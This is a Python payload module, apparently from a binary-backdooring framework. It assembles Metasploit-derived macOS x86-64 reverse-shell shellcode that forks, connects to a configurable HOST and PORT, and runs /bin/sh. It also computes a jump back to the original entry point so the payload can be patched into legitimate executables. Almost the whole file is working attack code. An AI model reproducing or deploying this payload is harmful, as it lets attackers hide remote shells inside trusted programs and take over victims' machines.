import struct
import os
import logging
from core import support
logger = logging.getLogger(__name__)
#eat_code_caves function is arch agnostic?
from common import common

class reverse_shell_tcp():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "reverse_shell_tcp"
        self.description = """Basic reverse_shell_tcp (non-stager) from metasploit"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['remove_signature']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        logger.debug(dir(self.PM))
        if support.support(self).check_reqs() is False:
            return False
        
        return self.run()

    def run(self):

        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
        self.shellcode2 = bytes("\xb8"
                           "\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49"
                           "\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe"
                           "\x00\x02", 'iso-8859-1'
                           )

        self.shellcode2 += struct.pack("!H", int(self.PORT))
        self.shellcode2 += common.pack_ip_addresses(self.HOST)
        self.shellcode2 += bytes("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
                            "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
                            "\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02"
                            "\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c"
                            "\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"
                            , 'iso-8859-1')

        self.shellcode1 = b"\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2"  # FORK()
        self.shellcode1 += b"\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset
        
        if self.BDF.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.BDF.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.BDF.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2

        return self.shellcode
        
